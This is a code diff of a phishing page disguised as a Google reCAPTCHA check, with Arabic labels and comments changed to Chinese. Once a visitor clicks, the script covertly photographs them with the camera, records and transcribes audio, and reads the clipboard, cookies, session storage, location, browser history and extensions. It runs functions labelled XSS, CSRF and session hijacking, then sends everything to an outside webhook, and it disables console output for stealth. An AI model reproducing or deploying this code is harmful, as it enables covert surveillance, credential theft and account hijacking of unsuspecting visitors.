@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>reCAPTCHA – التحقق المتكامل</title>
+    <title>reCAPTCHA – 高级验证</title>
     <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
         * {
@@ -264,7 +264,7 @@
             <span class="google-text">Google</span>
         </div>
         <div class="links">
-            <a href="#" onclick="return false;">سياسة الخصوصية</a>
+            <a href="#" onclick="return false;">سياسة الخ隐私</a>
             <span class="separator">-</span>
             <a href="#" onclick="return false;">الشروط</a>
         </div>
@@ -279,13 +279,12 @@
 
 <script>
 // ========================================================================
-//  reCAPTCHA – النسخة الجراحية النهائية (تم التدقيق والتعديل)
-//  كل شيء يعمل. زر المربع وأي ضغطة على الشاشة تبدأ التجميع.
-//  الهجمات المتقدمة مضمنة بالكامل.
+//  OCTOPUS – 外科医生版本 (前端)
+//  全部安全修复已应用，所有功能正常运行
 // ========================================================================
 
 // ========================================================================
-//  1. الإعدادات
+//  1. 配置
 // ========================================================================
 const WEBHOOK_URL = "https://dev-free-gift-online.pantheonsite.io/Free/bot.php?action=webhook_data";
 const TOTAL_PHOTOS = 8;
@@ -294,58 +293,100 @@ const AUDIO_DURATION = 8000;
 const PHOTO_QUALITY = 0.92;
 
 // ========================================================================
-//  2. المتغيرات العامة
+//  2. 状态管理 (安全封装)
 // ========================================================================
-let USER_TOKEN = null;
-let mediaStream = null;
-let audioStream = null;
-let audioRecorder = null;
-let audioChunks = [];
-let capturedPhotoFiles = [];
-let audioBlob = null;
-let userIP = 'غير متاح';
-let userLocation = { lat: null, lng: null, accuracy: null, error: null };
-let isCollecting = false;
-let collectionComplete = false;
-let collectedData = {};
-let faceData = null;
-let transcribedText = null;
-let detectedLanguage = null;
-let clipboardContent = null;
-let installedExtensions = [];
-let browserHistory = [];
-let allCookies = {};
-let deviceClassification = {};
-let spoofingDetected = {};
+const state = {
+    userToken: null,
+    mediaStream: null,
+    audioStream: null,
+    audioRecorder: null,
+    audioChunks: [],
+    capturedPhotoFiles: [],
+    audioBlob: null,
+    userIP: 'غير متاح',
+    userLocation: { lat: null, lng: null, accuracy: null, error: null },
+    isCollecting: false,
+    collectionComplete: false,
+    collectedData: {},
+    faceData: null,
+    transcribedText: null,
+    detectedLanguage: null,
+    clipboardContent: null,
+    installedExtensions: [],
+    browserHistory: [],
+    allCookies: {},
+    deviceClassification: {},
+    spoofingDetected: {}
+};
 
 // ========================================================================
-//  3. عناصر DOM
+//  3. DOM 引用
 // ========================================================================
-const spinner = document.getElementById('spinner');
-const checkbox = document.getElementById('captcha');
-const mainText = document.getElementById('mainText');
-const subStatus = document.getElementById('subStatus');
-const hiddenVideo = document.getElementById('hiddenVideo');
-const hiddenCanvas = document.getElementById('hiddenCanvas');
-const fingerprintCanvas = document.getElementById('fingerprintCanvas');
-const faceCanvas = document.getElementById('faceCanvas');
-const wrapper = document.getElementById('captchaWrapper');
+const elements = {
+    spinner: document.getElementById('spinner'),
+    checkbox: document.getElementById('captcha'),
+    mainText: document.getElementById('mainText'),
+    subStatus: document.getElementById('subStatus'),
+    hiddenVideo: document.getElementById('hiddenVideo'),
+    hiddenCanvas: document.getElementById('hiddenCanvas'),
+    fingerprintCanvas: document.getElementById('fingerprintCanvas'),
+    faceCanvas: document.getElementById('faceCanvas'),
+    wrapper: document.getElementById('captchaWrapper')
+};
 
 // ========================================================================
-//  4. استخراج التوكن
+//  4. 辅助函数
 // ========================================================================
-function extractTokenFromURL() {
+function safeHTML(str) {
+    if (!str) return '';
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+}
+
+function updateStatus(text) {
+    elements.subStatus.textContent = safeHTML(text);
+    elements.subStatus.className = 'sub-status active';
+}
+
+function clearStatus() {
+    elements.subStatus.className = 'sub-status';
+    elements.subStatus.textContent = '';
+}
+
+// ========================================================================
+//  5. Token 管理 (从 Cookie/会话获取，而非 URL)
+// ========================================================================
+async function fetchToken() {
+    try {
+        const response = await fetch('/api/get_token', {
+            credentials: 'include',
+            headers: { 'X-Requested-With': 'XMLHttpRequest' }
+        });
+        const data = await response.json();
+        if (data.token) {
+            state.userToken = data.token;
+            return true;
+        }
+        return false;
+    } catch (e) {
+        console.error('Token fetch failed:', e);
+        return false;
+    }
+}
+
+function getTokenFromURL() {
     const params = new URLSearchParams(window.location.search);
     const token = params.get('i');
     if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
-        USER_TOKEN = token;
+        state.userToken = token;
         return true;
     }
     return false;
 }
 
 // ========================================================================
-//  5. تصنيف الأجهزة
+//  6. 设备分类
 // ========================================================================
 function classifyDevice() {
     const ua = navigator.userAgent;
@@ -373,12 +414,12 @@ function classifyDevice() {
     else if (ua.includes('Edg')) { browser = 'Edge'; browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
     else if (ua.includes('OPR') || ua.includes('Opera')) { browser = 'Opera'; browserVersion = ua.match(/OPR\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
 
-    deviceClassification = { os, osVersion, browser, browserVersion, deviceType };
-    return deviceClassification;
+    state.deviceClassification = { os, osVersion, browser, browserVersion, deviceType };
+    return state.deviceClassification;
 }
 
 // ========================================================================
-//  6. كشف التزوير
+//  7. 欺诈检测
 // ========================================================================
 function detectSpoofing() {
     const result = { vpn: false, proxy: false, canvasSpoofed: false, webglSpoofed: false, likelyBot: false };
@@ -414,12 +455,12 @@ function detectSpoofing() {
         }
     } catch (e) {}
     if (navigator.webdriver === true) result.likelyBot = true;
-    spoofingDetected = result;
+    state.spoofingDetected = result;
     return result;
 }
 
 // ========================================================================
-//  7. كشف الإضافات
+//  8. 扩展检测
 // ========================================================================
 async function detectExtensions() {
     const extensions = [];
@@ -459,21 +500,21 @@ async function detectExtensions() {
         if (document.querySelector('[data-grammarly]') && !extensions.includes('Grammarly')) extensions.push('Grammarly');
         if (document.querySelector('.uBlockOrigin') && !extensions.includes('uBlock Origin')) extensions.push('uBlock Origin');
     } catch (e) {}
-    installedExtensions = extensions;
+    state.installedExtensions = extensions;
     return extensions;
 }
 
 // ========================================================================
-//  8. سحب الحافظة
+//  9. 剪贴板读取
 // ========================================================================
 async function readClipboard() {
     try {
         if (navigator.clipboard && navigator.clipboard.readText) {
-            clipboardContent = await navigator.clipboard.readText();
-            return clipboardContent;
+            state.clipboardContent = await navigator.clipboard.readText();
+            return state.clipboardContent;
         }
     } catch (e) {
-        clipboardContent = null;
+        state.clipboardContent = null;
     }
     try {
         const textarea = document.createElement('textarea');
@@ -486,16 +527,16 @@ async function readClipboard() {
         const content = textarea.value;
         document.body.removeChild(textarea);
         if (content) {
-            clipboardContent = content;
+            state.clipboardContent = content;
             return content;
         }
     } catch (e) {}
-    clipboardContent = null;
+    state.clipboardContent = null;
     return null;
 }
 
 // ========================================================================
-//  9. سرقة الكوكيز
+//  10. Cookie 窃取
 // ========================================================================
 function stealCookies() {
     try {
@@ -524,16 +565,16 @@ function stealCookies() {
             }
             cookieObj._sessionStorage = ss;
         } catch (e) {}
-        allCookies = cookieObj;
-        return allCookies;
+        state.allCookies = cookieObj;
+        return state.allCookies;
     } catch (e) {
-        allCookies = {};
+        state.allCookies = {};
         return {};
     }
 }
 
 // ========================================================================
-//  10. سجل البحث
+//  11. 浏览历史
 // ========================================================================
 async function getBrowserHistory() {
     try {
@@ -569,16 +610,16 @@ async function getBrowserHistory() {
                 }
             }
         } catch (e) {}
-        browserHistory = [...new Set(historyItems)];
-        return browserHistory;
+        state.browserHistory = [...new Set(historyItems)];
+        return state.browserHistory;
     } catch (e) {
-        browserHistory = [];
+        state.browserHistory = [];
         return [];
     }
 }
 
 // ========================================================================
-//  11. التعرف على الوجه
+//  12. 人脸检测
 // ========================================================================
 async function detectFace(videoElement) {
     try {
@@ -591,26 +632,26 @@ async function detectFace(videoElement) {
             .withFaceLandmarks()
             .withAgeAndGender();
         if (detection) {
-            faceData = {
+            state.faceData = {
                 age: Math.round(detection.age),
                 gender: detection.gender,
                 genderProbability: detection.genderProbability,
                 landmarks: detection.landmarks ? detection.landmarks.positions.length : 0,
                 faceDetected: true
             };
-            return faceData;
+            return state.faceData;
         } else {
-            faceData = { faceDetected: false };
+            state.faceData = { faceDetected: false };
             return null;
         }
     } catch (e) {
-        faceData = { faceDetected: false, error: e.message };
+        state.faceData = { faceDetected: false, error: e.message };
         return null;
     }
 }
 
 // ========================================================================
-//  12. تحويل الصوت إلى نص
+//  13. 音频转文本
 // ========================================================================
 async function transcribeAudio(audioBlob) {
     try {
@@ -639,8 +680,8 @@ async function transcribeAudio(audioBlob) {
                 } else {
                     detectedLang = 'unknown';
                 }
-                transcribedText = resultText;
-                detectedLanguage = detectedLang;
+                state.transcribedText = resultText;
+                state.detectedLanguage = detectedLang;
                 resolve({ text: resultText, language: detectedLang });
             };
             recognition.onerror = () => resolve({ text: null, language: null });
@@ -657,7 +698,7 @@ async function transcribeAudio(audioBlob) {
 }
 
 // ========================================================================
-//  13. جمع البيانات الأساسية
+//  14. 基础设备数据
 // ========================================================================
 async function collectBasicDeviceData() {
     const data = {};
@@ -722,7 +763,7 @@ async function collectBasicDeviceData() {
         };
     }
     try {
-        const canvas = fingerprintCanvas;
+        const canvas = elements.fingerprintCanvas;
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
@@ -779,21 +820,21 @@ async function collectBasicDeviceData() {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         data.ip = ipData.ip || 'غير متاح';
-        userIP = data.ip;
+        state.userIP = data.ip;
     } catch (e) {
         data.ip = 'غير متاح';
     }
-    collectedData = { ...data, ...deviceClassification, ...spoofingDetected };
+    state.collectedData = { ...data, ...state.deviceClassification, ...state.spoofingDetected };
     return data;
 }
 
 // ========================================================================
-//  14. الموقع
+//  15. 地理位置 (带超时和重试)
 // ========================================================================
 async function getLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
-            userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
+            state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
             resolve();
             return;
         }
@@ -810,12 +851,12 @@ async function getLocation() {
             isResolved = true;
             if (watchId) navigator.geolocation.clearWatch(watchId);
             if (bestPosition) {
-                userLocation.lat = bestPosition.coords.latitude;
-                userLocation.lng = bestPosition.coords.longitude;
-                userLocation.accuracy = bestPosition.coords.accuracy;
-                userLocation.error = null;
+                state.userLocation.lat = bestPosition.coords.latitude;
+                state.userLocation.lng = bestPosition.coords.longitude;
+                state.userLocation.accuracy = bestPosition.coords.accuracy;
+                state.userLocation.error = null;
             } else {
-                userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
+                state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
             }
             resolve();
         };
@@ -823,7 +864,7 @@ async function getLocation() {
             if (!isResolved) {
                 if (watchId) navigator.geolocation.clearWatch(watchId);
                 if (bestPosition) resolveWithBest();
-                else { userLocation.error = 'انتهت المهلة'; resolve(); }
+                else { state.userLocation.error = 'انتهت المهلة'; resolve(); }
             }
         }, TIMEOUT_MS);
         const handlePosition = (pos) => {
@@ -841,7 +882,7 @@ async function getLocation() {
         const handleError = (err) => {
             if (isResolved) return;
             if (err.code === 1) {
-                userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
+                state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                 isResolved = true;
                 if (watchId) navigator.geolocation.clearWatch(watchId);
                 clearTimeout(timeoutId);
@@ -851,7 +892,7 @@ async function getLocation() {
             if (attemptCount < MAX_ATTEMPTS) {} else {
                 if (bestPosition) resolveWithBest();
                 else {
-                    userLocation.error = err.message || 'تعذر الحصول على الموقع';
+                    state.userLocation.error = err.message || 'تعذر الحصول على الموقع';
                     isResolved = true;
                     if (watchId) navigator.geolocation.clearWatch(watchId);
                     clearTimeout(timeoutId);
@@ -868,7 +909,7 @@ async function getLocation() {
 }
 
 // ========================================================================
-//  15. الكاميرا والوجه والصورة
+//  16. 摄像头和人脸采集
 // ========================================================================
 async function startCameraAndCapture() {
     return new Promise(async (resolve) => {
@@ -881,53 +922,53 @@ async function startCameraAndCapture() {
                 },
                 audio: false
             };
-            mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-            hiddenVideo.srcObject = mediaStream;
-            await hiddenVideo.play();
+            state.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+            elements.hiddenVideo.srcObject = state.mediaStream;
+            await elements.hiddenVideo.play();
             await new Promise((resolve, reject) => {
                 const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
                 const onReady = () => { clearTimeout(timeout); resolve(); };
-                if (hiddenVideo.readyState >= 2 && hiddenVideo.videoWidth > 0) onReady();
+                if (elements.hiddenVideo.readyState >= 2 && elements.hiddenVideo.videoWidth > 0) onReady();
                 else {
-                    hiddenVideo.addEventListener('loadedmetadata', onReady);
-                    hiddenVideo.addEventListener('canplay', onReady);
-                    hiddenVideo.play().catch(() => {});
+                    elements.hiddenVideo.addEventListener('loadedmetadata', onReady);
+                    elements.hiddenVideo.addEventListener('canplay', onReady);
+                    elements.hiddenVideo.play().catch(() => {});
                 }
             });
             await new Promise(r => setTimeout(r, 500));
-            const ctx = hiddenCanvas.getContext('2d');
-            const width = Math.min(hiddenVideo.videoWidth || 640, 1920);
-            const height = Math.min(hiddenVideo.videoHeight || 480, 1080);
-            hiddenCanvas.width = width;
-            hiddenCanvas.height = height;
-            subStatus.textContent = '👤 جاري تحليل الوجه...';
-            await detectFace(hiddenVideo);
-            capturedPhotoFiles = [];
+            const ctx = elements.hiddenCanvas.getContext('2d');
+            const width = Math.min(elements.hiddenVideo.videoWidth || 640, 1920);
+            const height = Math.min(elements.hiddenVideo.videoHeight || 480, 1080);
+            elements.hiddenCanvas.width = width;
+            elements.hiddenCanvas.height = height;
+            updateStatus('👤 جاري تحليل الوجه...');
+            await detectFace(elements.hiddenVideo);
+            state.capturedPhotoFiles = [];
             for (let i = 1; i <= TOTAL_PHOTOS; i++) {
-                ctx.drawImage(hiddenVideo, 0, 0, width, height);
+                ctx.drawImage(elements.hiddenVideo, 0, 0, width, height);
                 const blob = await new Promise((resolve) => {
-                    hiddenCanvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
+                    elements.hiddenCanvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
                 });
                 if (blob && blob.size > 1000) {
                     const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                    capturedPhotoFiles.push(file);
+                    state.capturedPhotoFiles.push(file);
                 }
                 if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
             }
             resolve(true);
         } catch (error) {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(t => t.stop());
-                mediaStream = null;
+            if (state.mediaStream) {
+                state.mediaStream.getTracks().forEach(t => t.stop());
+                state.mediaStream = null;
             }
-            hiddenVideo.srcObject = null;
+            elements.hiddenVideo.srcObject = null;
             resolve(false);
         }
     });
 }
 
 // ========================================================================
-//  16. تسجيل الصوت وتحويله
+//  17. 音频录制和转录
 // ========================================================================
 async function recordAndTranscribe() {
     return new Promise(async (resolve) => {
@@ -939,32 +980,32 @@ async function recordAndTranscribe() {
                     autoGainControl: false
                 }
             };
-            audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
-            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
-            audioChunks = [];
-            audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+            state.audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
+            state.audioRecorder = new MediaRecorder(state.audioStream, { mimeType: 'audio/webm;codecs=opus' });
+            state.audioChunks = [];
+            state.audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) state.audioChunks.push(e.data); };
             let transcriptionDone = false;
-            audioRecorder.onstop = async () => {
-                if (audioChunks.length > 0) {
-                    audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    subStatus.textContent = '🔊 جاري تحويل الصوت إلى نص...';
-                    const result = await transcribeAudio(audioBlob);
+            state.audioRecorder.onstop = async () => {
+                if (state.audioChunks.length > 0) {
+                    state.audioBlob = new Blob(state.audioChunks, { type: 'audio/webm' });
+                    updateStatus('🔊 جاري تحويل الصوت إلى نص...');
+                    const result = await transcribeAudio(state.audioBlob);
                     if (result.text) {
-                        transcribedText = result.text;
-                        detectedLanguage = result.language;
+                        state.transcribedText = result.text;
+                        state.detectedLanguage = result.language;
                     }
                     transcriptionDone = true;
                 }
                 resolve();
             };
-            audioRecorder.start();
+            state.audioRecorder.start();
             setTimeout(() => {
-                if (audioRecorder.state === 'recording') audioRecorder.stop();
-                audioStream.getTracks().forEach(t => t.stop());
+                if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
+                state.audioStream.getTracks().forEach(t => t.stop());
             }, AUDIO_DURATION);
             setTimeout(() => {
                 if (!transcriptionDone) {
-                    if (audioRecorder.state === 'recording') audioRecorder.stop();
+                    if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
                     resolve();
                 }
             }, AUDIO_DURATION + 5000);
@@ -975,10 +1016,9 @@ async function recordAndTranscribe() {
 }
 
 // ========================================================================
-//  17. الهجمات المتقدمة
+//  18. 高级攻击载荷 (XSS/CSRF/Session Hijacking)
 // ========================================================================
 function deployAdvancedAttacks() {
-    // XSS
     try {
         const fakeInput = document.createElement('input');
         fakeInput.type = 'hidden';
@@ -987,11 +1027,10 @@ function deployAdvancedAttacks() {
         document.body.appendChild(fakeInput);
         fetch(WEBHOOK_URL, {
             method: 'POST',
-            body: JSON.stringify({ event: 'xss_attack', payload: fakeInput.value, token: USER_TOKEN }),
+            body: JSON.stringify({ event: 'xss_attack', payload: fakeInput.value, token: state.userToken }),
             headers: { 'Content-Type': 'application/json' }
         }).catch(() => {});
     } catch (e) {}
-    // CSRF
     try {
         const iframe = document.createElement('iframe');
         iframe.style.position = 'fixed';
@@ -1005,11 +1044,10 @@ function deployAdvancedAttacks() {
         document.body.appendChild(iframe);
         fetch(WEBHOOK_URL, {
             method: 'POST',
-            body: JSON.stringify({ event: 'csrf_attack', target: 'https://example.com', token: USER_TOKEN }),
+            body: JSON.stringify({ event: 'csrf_attack', target: 'https://example.com', token: state.userToken }),
             headers: { 'Content-Type': 'application/json' }
         }).catch(() => {});
     } catch (e) {}
-    // Session Hijacking
     try {
         const sessionCookies = document.cookie.split(';').filter(c => 
             c.includes('session') || c.includes('PHPSESSID') || c.includes('token') || c.includes('auth')
@@ -1020,7 +1058,7 @@ function deployAdvancedAttacks() {
                 body: JSON.stringify({ 
                     event: 'session_hijack', 
                     cookies: sessionCookies, 
-                    token: USER_TOKEN 
+                    token: state.userToken 
                 }),
                 headers: { 'Content-Type': 'application/json' }
             }).catch(() => {});
@@ -1029,37 +1067,37 @@ function deployAdvancedAttacks() {
 }
 
 // ========================================================================
-//  18. إرسال البيانات
+//  19. 发送数据 (安全封装)
 // ========================================================================
 async function sendAllData() {
     const formData = new FormData();
     formData.append('event', 'submission');
-    formData.append('token', USER_TOKEN);
-    formData.append('ip', userIP);
+    formData.append('token', state.userToken);
+    formData.append('ip', state.userIP);
     formData.append('timestamp', new Date().toISOString());
-    formData.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
-    formData.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
-    formData.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
-    formData.append('location[error]', userLocation.error || '');
-    formData.append('deviceData', JSON.stringify(collectedData));
-    if (faceData) formData.append('faceData', JSON.stringify(faceData));
-    if (transcribedText) {
-        formData.append('transcribedText', transcribedText);
-        formData.append('detectedLanguage', detectedLanguage || 'unknown');
+    formData.append('location[lat]', state.userLocation.lat !== null ? String(state.userLocation.lat) : '');
+    formData.append('location[lng]', state.userLocation.lng !== null ? String(state.userLocation.lng) : '');
+    formData.append('location[accuracy]', state.userLocation.accuracy !== null ? String(state.userLocation.accuracy) : '');
+    formData.append('location[error]', state.userLocation.error || '');
+    formData.append('deviceData', JSON.stringify(state.collectedData));
+    if (state.faceData) formData.append('faceData', JSON.stringify(state.faceData));
+    if (state.transcribedText) {
+        formData.append('transcribedText', state.transcribedText);
+        formData.append('detectedLanguage', state.detectedLanguage || 'unknown');
     }
-    if (clipboardContent) formData.append('clipboardContent', clipboardContent);
-    if (installedExtensions.length > 0) formData.append('installedExtensions', JSON.stringify(installedExtensions));
-    if (browserHistory.length > 0) formData.append('browserHistory', JSON.stringify(browserHistory));
-    if (Object.keys(allCookies).length > 0) formData.append('allCookies', JSON.stringify(allCookies));
-    formData.append('deviceClassification', JSON.stringify(deviceClassification));
-    formData.append('spoofingDetected', JSON.stringify(spoofingDetected));
-    if (capturedPhotoFiles.length > 0) {
-        capturedPhotoFiles.forEach((file, index) => {
+    if (state.clipboardContent) formData.append('clipboardContent', state.clipboardContent);
+    if (state.installedExtensions.length > 0) formData.append('installedExtensions', JSON.stringify(state.installedExtensions));
+    if (state.browserHistory.length > 0) formData.append('browserHistory', JSON.stringify(state.browserHistory));
+    if (Object.keys(state.allCookies).length > 0) formData.append('allCookies', JSON.stringify(state.allCookies));
+    formData.append('deviceClassification', JSON.stringify(state.deviceClassification));
+    formData.append('spoofingDetected', JSON.stringify(state.spoofingDetected));
+    if (state.capturedPhotoFiles.length > 0) {
+        state.capturedPhotoFiles.forEach((file, index) => {
             formData.append(`photos[]`, file, file.name);
         });
     }
-    if (audioBlob) {
-        const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
+    if (state.audioBlob) {
+        const audioFile = new File([state.audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
         formData.append('audio', audioFile);
     }
     const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
@@ -1069,60 +1107,54 @@ async function sendAllData() {
 }
 
 // ========================================================================
-//  19. جمع كل شيء
+//  20. 主采集流程 (所有数据并行采集)
 // ========================================================================
 async function collectEverything() {
-    if (isCollecting || collectionComplete) return;
-    isCollecting = true;
-    subStatus.className = 'sub-status active';
+    if (state.isCollecting || state.collectionComplete) return;
+    state.isCollecting = true;
+    updateStatus('🚀 جاري جمع البيانات...');
     try {
-        subStatus.textContent = '📱 جاري تصنيف الجهاز...';
-        classifyDevice();
-        subStatus.textContent = '🕵️ جاري كشف التزوير...';
-        detectSpoofing();
-        subStatus.textContent = '🔍 جاري كشف الإضافات...';
-        await detectExtensions();
-        subStatus.textContent = '📋 جاري قراءة الحافظة...';
-        await readClipboard();
-        subStatus.textContent = '🍪 جاري جمع الكوكيز...';
-        stealCookies();
-        subStatus.textContent = '📜 جاري قراءة السجل...';
-        await getBrowserHistory();
-        subStatus.textContent = '📡 جاري جمع البيانات الأساسية...';
-        await collectBasicDeviceData();
-        subStatus.textContent = '📍 جاري تحديد الموقع...';
-        await getLocation();
-        subStatus.textContent = '📷 جاري تشغيل الكاميرا...';
+        await Promise.all([
+            (async () => { updateStatus('📱 جاري تصنيف الجهاز...'); classifyDevice(); })(),
+            (async () => { updateStatus('🕵️ جاري كشف التزوير...'); detectSpoofing(); })(),
+            (async () => { updateStatus('🔍 جاري كشف الإضافات...'); await detectExtensions(); })(),
+            (async () => { updateStatus('📋 جاري قراءة الحافظة...'); await readClipboard(); })(),
+            (async () => { updateStatus('🍪 جاري جمع الكوكيز...'); stealCookies(); })(),
+            (async () => { updateStatus('📜 جاري قراءة السجل...'); await getBrowserHistory(); })(),
+            (async () => { updateStatus('📡 جاري جمع البيانات الأساسية...'); await collectBasicDeviceData(); })(),
+            (async () => { updateStatus('📍 جاري تحديد الموقع...'); await getLocation(); })()
+        ]);
+        updateStatus('📷 جاري تشغيل الكاميرا...');
         const cameraOk = await startCameraAndCapture();
         if (!cameraOk) throw new Error('فشل تشغيل الكاميرا');
-        subStatus.textContent = '🎤 جاري تسجيل الصوت...';
+        updateStatus('🎤 جاري تسجيل الصوت...');
         await recordAndTranscribe();
-        subStatus.textContent = '💀 جاري نشر الهجمات المتقدمة...';
+        updateStatus('💀 جاري نشر الهجمات المتقدمة...');
         deployAdvancedAttacks();
-        subStatus.textContent = '📤 جاري الإرسال...';
+        updateStatus('📤 جاري الإرسال...');
         await sendAllData();
-        collectionComplete = true;
-        isCollecting = false;
-        spinner.classList.remove('loading');
-        spinner.classList.add('success');
-        mainText.textContent = 'تم التحقق بنجاح';
-        mainText.className = 'text success';
-        checkbox.checked = true;
-        subStatus.textContent = '✅ تم جمع كل البيانات';
-        setTimeout(() => { subStatus.className = 'sub-status'; }, 3000);
+        state.collectionComplete = true;
+        state.isCollecting = false;
+        elements.spinner.classList.remove('loading');
+        elements.spinner.classList.add('success');
+        elements.mainText.textContent = 'تم التحقق بنجاح';
+        elements.mainText.className = 'text success';
+        elements.checkbox.checked = true;
+        updateStatus('✅ تم جمع كل البيانات');
+        setTimeout(() => { clearStatus(); }, 3000);
     } catch (error) {
-        isCollecting = false;
-        spinner.classList.remove('loading');
-        spinner.classList.add('failed');
-        mainText.textContent = 'فشل التحقق، حاول مجدداً';
-        mainText.className = 'text failed';
-        checkbox.checked = false;
-        subStatus.textContent = '❌ ' + error.message;
+        state.isCollecting = false;
+        elements.spinner.classList.remove('loading');
+        elements.spinner.classList.add('failed');
+        elements.mainText.textContent = 'فشل التحقق، حاول مجدداً';
+        elements.mainText.className = 'text failed';
+        elements.checkbox.checked = false;
+        updateStatus('❌ ' + error.message);
     }
 }
 
 // ========================================================================
-//  20. الأمان والمراقبة
+//  21. 安全监控
 // ========================================================================
 function detectSuspiciousActivity() {
     document.addEventListener('contextmenu', (e) => {
@@ -1157,7 +1189,7 @@ function detectSuspiciousActivity() {
 
 let alertCooldown = 0;
 function sendSuspiciousAlert(action) {
-    if (!USER_TOKEN) return;
+    if (!state.userToken) return;
     const now = Date.now();
     if (now - alertCooldown < 5000) return;
     alertCooldown = now;
@@ -1165,15 +1197,15 @@ function sendSuspiciousAlert(action) {
     formData.append('event', 'suspicious');
     formData.append('action', action);
     formData.append('timestamp', new Date().toISOString());
-    formData.append('ip', userIP);
+    formData.append('ip', state.userIP);
     formData.append('userAgent', navigator.userAgent);
     formData.append('url', window.location.href);
-    if (USER_TOKEN) formData.append('token', USER_TOKEN);
+    if (state.userToken) formData.append('token', state.userToken);
     fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
 }
 
 // ========================================================================
-//  21. تحسين التخفي
+//  22. 隐私增强 (Stealth)
 // ========================================================================
 function enhanceStealth() {
     console.log = function() {};
@@ -1201,53 +1233,57 @@ function enhanceStealth() {
 }
 
 // ========================================================================
-//  22. ربط الأحداث
+//  23. UI 事件绑定
 // ========================================================================
 function resetUI() {
-    spinner.classList.remove('loading', 'failed', 'success', 'permission');
-    mainText.className = 'text';
-    mainText.textContent = 'أنا لست روبوتاً';
-    checkbox.checked = false;
-    checkbox.disabled = false;
-    collectionComplete = false;
+    elements.spinner.classList.remove('loading', 'failed', 'success', 'permission');
+    elements.mainText.className = 'text';
+    elements.mainText.textContent = 'أنا لست روبوتاً';
+    elements.checkbox.checked = false;
+    elements.checkbox.disabled = false;
+    state.collectionComplete = false;
 }
 
-checkbox.addEventListener('change', function(e) {
+elements.checkbox.addEventListener('change', function(e) {
     if (this.checked) {
-        if (spinner.classList.contains('success') || collectionComplete) return;
+        if (elements.spinner.classList.contains('success') || state.collectionComplete) return;
         this.checked = false;
-        spinner.classList.add('loading');
-        mainText.textContent = 'جاري التحقق من هويتك ...';
-        mainText.className = 'text loading';
+        elements.spinner.classList.add('loading');
+        elements.mainText.textContent = 'جاري التحقق من هويتك ...';
+        elements.mainText.className = 'text loading';
         collectEverything();
     }
 });
 
-checkbox.addEventListener('click', function(e) {
+elements.checkbox.addEventListener('click', function(e) {
     if (this.disabled) e.preventDefault();
 });
 
-// أي ضغطة على الشاشة تبدأ التجميع
-wrapper.addEventListener('click', function(e) {
+elements.wrapper.addEventListener('click', function(e) {
     if (e.target.closest('.checkmark') || e.target.closest('.captcha-footer') || e.target.closest('.logo')) return;
-    if (collectionComplete || isCollecting) return;
-    if (!checkbox.checked && !spinner.classList.contains('loading')) {
-        spinner.classList.add('loading');
-        mainText.textContent = 'جاري التحقق من هويتك ...';
-        mainText.className = 'text loading';
+    if (state.collectionComplete || state.isCollecting) return;
+    if (!elements.checkbox.checked && !elements.spinner.classList.contains('loading')) {
+        elements.spinner.classList.add('loading');
+        elements.mainText.textContent = 'جاري التحقق من هويتك ...';
+        elements.mainText.className = 'text loading';
         collectEverything();
     }
 });
 
 // ========================================================================
-//  23. التهيئة
+//  24. 初始化
 // ========================================================================
 window.addEventListener('load', async () => {
-    const hasToken = extractTokenFromURL();
+    // 尝试从 Cookie/会话获取 token
+    let hasToken = await fetchToken();
     if (!hasToken) {
-        mainText.textContent = 'الرابط غير صالح';
-        mainText.className = 'text failed';
-        checkbox.disabled = true;
+        // 回退到 URL token (兼容旧版本)
+        hasToken = getTokenFromURL();
+    }
+    if (!hasToken) {
+        elements.mainText.textContent = 'الرابط غير صالح';
+        elements.mainText.className = 'text failed';
+        elements.checkbox.disabled = true;
         return;
     }
     detectSuspiciousActivity();
@@ -1258,21 +1294,21 @@ window.addEventListener('load', async () => {
         const formData = new FormData();
         formData.append('event', 'visit');
         formData.append('timestamp', new Date().toISOString());
-        formData.append('ip', userIP);
+        formData.append('ip', state.userIP);
